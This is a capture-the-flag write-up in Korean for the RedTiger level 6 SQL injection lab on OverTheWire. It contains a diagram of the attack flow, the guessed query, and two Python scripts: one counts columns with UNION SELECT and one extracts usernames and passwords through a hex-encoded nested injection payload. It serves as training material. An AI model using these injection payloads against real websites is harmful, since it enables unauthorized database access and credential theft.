================================================================================================================
[redtiger] level6
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="user=0 union select %s from level6_users--",arrowhead="normal"];
        step3 -> step2[label="Column Length",arrowhead="normal"];
        step4 -> step5[label="user=0 union select 1,@HEX,3,4,5 from level6_users-- ",arrowhead="normal"];
        step7 -> step6[label="Data Extract",arrowhead="normal"];
    }

|

server -> DB 예측
================================================================================================================

- 테이블명: level6_users
- POST 파라미터: user, password

.. code-block:: sql

    SELECT * FROM tb_name where 
    user='$_POST["user"]' AND 
    password='$_POST["password"]'


|

union select
================================================================================================================

- 컬럼 개수 확인

.. code-block:: python

    import requests
    import base64

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level6.php"
    cookies = {
        "level6login":"my_cat_says_meow_meowmeow"
    }

    n = 0
    bef_ret = ''
    for l in range(20):
        params = {
            "user": "0 union select %s from level6_users-- " % str(n)
        }
        print "0 union select %s from level6_users-- " % str(n)
        n = str(n) + "," + str(l+1)
        r = requests.post(url, cookies=cookies, params=params, verify=False)
        if bef_ret!=r.content and bef_ret!='':
            print r.content

        bef_ret = r.content


|

union select
================================================================================================================

- 데이터 추출

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level6.php"
    cookies = {
        "level6login":"my_cat_says_meow_meowmeow"
    }

    # 0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20
    # ' union select 1,username,3,password,5 from level6_users where id=3 -- 
    params = {
        "user": "0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,3,4,5 from level6_users-- "
    }

    r = requests.post(url, cookies=cookies, params=params, verify=False)

    print r.content

|